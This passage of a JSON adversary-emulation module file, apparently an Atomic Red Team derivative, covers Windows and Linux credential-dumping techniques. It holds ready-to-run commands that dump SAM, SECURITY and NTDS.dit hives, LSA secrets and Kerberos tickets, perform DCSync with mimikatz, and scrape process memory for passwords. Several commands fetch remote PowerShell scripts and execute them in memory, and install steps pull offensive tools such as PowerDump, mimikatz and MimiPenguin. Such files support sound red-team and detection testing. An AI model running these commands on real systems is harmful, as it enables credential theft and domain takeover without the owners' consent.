          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerDump.ps1\""
        }
      ],
      "rx_module_id": "804f28fc-68fc-40da-b5a2-e9d0bce5c193",
      "module_name": "PowerDump Hashes and Usernames from Registry"
    },
    {
      "index": 28,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n",
        "elevation_required": false,
        "cleanup_command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a >nul 2>&1)\n"
      },
      "variables": [
        {
          "name": "target_hive",
          "description": "Hive you wish to dump",
          "type": "string",
          "default_value": "SAM"
        },
        {
          "name": "limit",
          "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
          "type": "integer",
          "default_value": 10
        }
      ],
      "prerequisites": [],
      "rx_module_id": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7",
      "module_name": "dump volume shadow copy hives with certutil"
    },
    {
      "index": 29,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
        "elevation_required": false,
        "cleanup_command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n"
      },
      "variables": [
        {
          "name": "target_hive",
          "description": "Hive you wish to dump",
          "type": "string",
          "default_value": "SAM"
        },
        {
          "name": "limit",
          "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
          "type": "integer",
          "default_value": 10
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9d77fed7-05f8-476e-a81b-8ff0472c64d0",
      "module_name": "dump volume shadow copy hives with System.IO.File"
    },
    {
      "index": 30,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb",
      "module_name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes"
    },
    {
      "index": 31,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg export HKLM\\sam %temp%\\sam\nreg export HKLM\\system %temp%\\system\nreg export HKLM\\security %temp%\\security\n",
        "elevation_required": true,
        "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "21df41be-cdd8-4695-a650-c3981113aa3c",
      "module_name": "Dumping of SAM, creds, and secrets(Reg Export)"
    },
    {
      "index": 32,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "vssadmin.exe create shadow /for=#{drive_letter}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "drive_letter",
          "description": "Drive letter to source VSC (including colon)",
          "type": "string",
          "default_value": "C:"
        }
      ],
      "prerequisites": [
        {
          "description": "Target must be a Domain Controller\n",
          "check_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
          "install_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
        }
      ],
      "rx_module_id": "dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f",
      "module_name": "Create Volume Shadow Copy with vssadmin"
    },
    {
      "index": 33,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n",
        "elevation_required": true,
        "cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul\n"
      },
      "variables": [
        {
          "name": "vsc_name",
          "description": "Name of Volume Shadow Copy",
          "type": "string",
          "default_value": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
        },
        {
          "name": "extract_path",
          "description": "Path for extracted NTDS.dit",
          "type": "path",
          "default_value": "C:\\Windows\\Temp"
        }
      ],
      "prerequisites": [
        {
          "description": "Target must be a Domain Controller\n",
          "check_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
          "install_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
        },
        {
          "description": "Volume shadow copy must exist\n",
          "check_command": "if not exist #{vsc_name} (exit /b 1)\n",
          "install_command": "echo Run \"Invoke-RAGLOXTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement\n"
        },
        {
          "description": "Extract path must exist\n",
          "check_command": "if not exist #{extract_path} (exit /b 1)\n",
          "install_command": "mkdir #{extract_path}\n"
        }
      ],
      "rx_module_id": "c6237146-9ea6-4711-85c9-c56d263a6b03",
      "module_name": "Copy NTDS.dit from Volume Shadow Copy"
    },
    {
      "index": 34,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
        "elevation_required": true,
        "cleanup_command": "rmdir /q /s #{output_folder} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "output_folder",
          "description": "Path where resulting dump should be placed",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\ntds_T1003"
        }
      ],
      "prerequisites": [
        {
          "description": "Target must be a Domain Controller\n",
          "check_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
          "install_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
        }
      ],
      "rx_module_id": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
      "module_name": "Dump Active Directory Database with NTDSUtil"
    },
    {
      "index": 35,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic shadowcopy call create Volume=#{drive_letter}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "drive_letter",
          "description": "Drive letter to source VSC (including colon and backslash)",
          "type": "string",
          "default_value": "C:\\"
        }
      ],
      "prerequisites": [
        {
          "description": "Target must be a Domain Controller\n",
          "check_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
          "install_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
        }
      ],
      "rx_module_id": "224f7de0-8f0a-4a94-b5d8-989b036c86da",
      "module_name": "Create Volume Shadow Copy with WMI"
    },
    {
      "index": 36,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "drive_letter",
          "description": "Drive letter to source VSC (including colon and backslash)",
          "type": "string",
          "default_value": "C:\\"
        },
        {
          "name": "target_host",
          "description": "IP Address / Hostname you want to target",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [
        {
          "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
          "check_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
          "install_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"
        }
      ],
      "rx_module_id": "d893459f-71f0-484d-9808-ec83b2b64226",
      "module_name": "Create Volume Shadow Copy remotely with WMI"
    },
    {
      "index": 37,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_path",
          "description": "File to shadow copy",
          "type": "string",
          "default_value": "c:\\windows\\ntds\\ntds.dit"
        },
        {
          "name": "target_path",
          "description": "Target path of the result file",
          "type": "string",
          "default_value": "c:\\ntds.dit"
        },
        {
          "name": "target_host",
          "description": "IP Address / Hostname you want to target",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [
        {
          "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
          "check_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
          "install_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"
        }
      ],
      "rx_module_id": "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865",
      "module_name": "Create Volume Shadow Copy remotely (WMI) with esentutl"
    },
    {
      "index": 38,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "drive_letter",
          "description": "Drive letter to source VSC (including colon)",
          "type": "string",
          "default_value": "C:\\"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "542bb97e-da53-436b-8e43-e0a7d31a6c24",
      "module_name": "Create Volume Shadow Copy with Powershell"
    },
    {
      "index": 39,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "drive_letter",
          "description": "Drive letter to source VSC (including colon)",
          "type": "string",
          "default_value": "C:"
        },
        {
          "name": "symlink_path",
          "description": "symlink path",
          "type": "string",
          "default_value": "C:\\Temp\\vssstore"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "21748c28-2793-4284-9e07-d6d028b66702",
      "module_name": "Create Symlink to Volume Shadow Copy"
    },
    {
      "index": 40,
      "technique_id": "T1003.003",
      "technique_name": "OS Credential Dumping: NTDS",
      "description": "This test is intended to be run on a domain controller\nAn alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir c:\\exfil\ndiskshadow.exe /s #{filename}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "filename",
          "description": "Location of the script",
          "type": "Path",
          "default_value": "PathToRagloxModulesFolder\\T1003.003\\src\\diskshadow.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b385996c-0e7d-4e27-95a4-aca046b119a7",
      "module_name": "Create Volume Shadow Copy with diskshadow"
    },
    {
      "index": 41,
      "technique_id": "T1003.004",
      "technique_name": "OS Credential Dumping: LSA Secrets",
      "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n",
        "elevation_required": true,
        "cleanup_command": "del %temp%\\secrets >nul 2> nul"
      },
      "variables": [
        {
          "name": "psexec_exe",
          "description": "Path to PsExec executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
          "check_command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}",
          "install_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PSTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PSTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PSTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe\" \"#{psexec_exe}\" -Force"
        }
      ],
      "rx_module_id": "55295ab0-a703-433b-9ca4-ae13807de12f",
      "module_name": "Dumping LSA Secrets"
    },
    {
      "index": 42,
      "technique_id": "T1003.004",
      "technique_name": "OS Credential Dumping: LSA Secrets",
      "description": "This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.\nIf the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.\nRef: https://github.com/MzHmO/PowershellKerberos/\nAuthor of dumper.ps1: Michael Zhmaylo (@MzHmO)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2dfa3bff-9a27-46db-ab75-7faefdaca732",
      "module_name": "Dump Kerberos Tickets from LSA using dumper.ps1"
    },
    {
      "index": 43,
      "technique_id": "T1003.005",
      "technique_name": "OS Credential Dumping: Cached Domain Credentials",
      "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmdkey /list\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "56506854-89d6-46a3-9804-b7fde90791f9",
      "module_name": "Cached Credential Dump via Cmdkey"
    },
    {
      "index": 44,
      "technique_id": "T1003.006",
      "technique_name": "OS Credential Dumping: DCSync",
      "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Targeted Active Directory domain",
          "type": "string",
          "default_value": "%userdnsdomain%"
        },
        {
          "name": "user",
          "description": "Targeted user",
          "type": "string",
          "default_value": "krbtgt"
        },
        {
          "name": "mimikatz_path",
          "description": "Mimikatz windows executable",
          "type": "path",
          "default_value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
      "module_name": "DCSync (Active Directory)"
    },
    {
      "index": 45,
      "technique_id": "T1003.006",
      "technique_name": "OS Credential Dumping: DCSync",
      "description": "The following RAGLOX will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ADReplAccount -All -Server #{logonserver}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "logonserver",
          "description": "ComputerName argument default %logonserver%",
          "type": "string",
          "default_value": "$ENV:logonserver.TrimStart(\"\\\")"
        }
      ],
      "prerequisites": [
        {
          "description": "DSInternals must be installed\n",
          "check_command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module -Name DSInternals -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
      "module_name": "Run DSInternals Get-ADReplAccount"
    },
    {
      "index": 46,
      "technique_id": "T1003.007",
      "technique_name": "OS Credential Dumping: Proc Filesystem",
      "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n",
        "elevation_required": true,
        "cleanup_command": "rm -f \"#{output_file}\"\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.007.bin"
        },
        {
          "name": "script_path",
          "description": "Path to script generating the target process",
          "type": "path",
          "default_value": "/tmp/T1003.007.sh"
        },
        {
          "name": "pid_term",
          "description": "Unique string to use to identify target process",
          "type": "string",
          "default_value": "T1003.007"
        }
      ],
      "prerequisites": [
        {
          "description": "Script to launch target process must exist\n",
          "check_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
          "install_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
        }
      ],
      "rx_module_id": "7e91138a-8e74-456d-a007-973d67a0bb80",
      "module_name": "Dump individual process memory with sh (Local)"
    },
    {
      "index": 47,
      "technique_id": "T1003.007",
      "technique_name": "OS Credential Dumping: Proc Filesystem",
      "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"#{output_file}\" | grep -i PASS\n",
        "elevation_required": true,
        "cleanup_command": "rm -f \"#{output_file}\"\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.007.bin"
        },
        {
          "name": "script_path",
          "description": "Path to script generating the target process",
          "type": "path",
          "default_value": "/tmp/T1003.007.sh"
        },
        {
          "name": "pid_term",
          "description": "Unique string to use to identify target process",
          "type": "string",
          "default_value": "T1003.007"
        }
      ],
      "prerequisites": [
        {
          "description": "Script to launch target process must exist\n",
          "check_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
          "install_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
        }
      ],
      "rx_module_id": "fa37b633-e097-4415-b2b8-c5bf4c86e423",
      "module_name": "Dump individual process memory with sh on FreeBSD (Local)"
    },
    {
      "index": 48,
      "technique_id": "T1003.007",
      "technique_name": "OS Credential Dumping: Proc Filesystem",
      "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n",
        "elevation_required": true,
        "cleanup_command": "rm -f \"#{output_file}\"\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.007.bin"
        },
        {
          "name": "script_path",
          "description": "Path to script generating the target process",
          "type": "path",
          "default_value": "/tmp/T1003.007.sh"
        },
        {
          "name": "python_script",
          "description": "Path to script generating the target process",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1003.007/src/dump_heap.py"
        },
        {
          "name": "pid_term",
          "description": "Unique string to use to identify target process",
          "type": "string",
          "default_value": "T1003.007"
        }
      ],
      "prerequisites": [
        {
          "description": "Script to launch target process must exist\n",
          "check_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
          "install_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
        },
        {
          "description": "Requires Python\n",
          "check_command": "(which python || which python3 || which python2)\n",
          "install_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"
        }
      ],
      "rx_module_id": "437b2003-a20d-4ed8-834c-4964f24eec63",
      "module_name": "Dump individual process memory with Python (Local)"
    },
    {
      "index": 49,
      "technique_id": "T1003.007",
      "technique_name": "OS Credential Dumping: Proc Filesystem",
      "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file} > /dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.007Test3.txt"
        },
        {
          "name": "MimiPenguin_Location",
          "description": "Path of MimiPenguin script",
          "type": "path",
          "default_value": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
          "check_command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n"
        },
        {
          "description": "Strings must be installed\n",
          "check_command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "sudo apt-get -y install binutils\n"
        },
        {
          "description": "Python2 must be installed\n",
          "check_command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "sudo apt-get -y install python2       \n"
        },
        {
          "description": "Libc-bin must be installed\n",
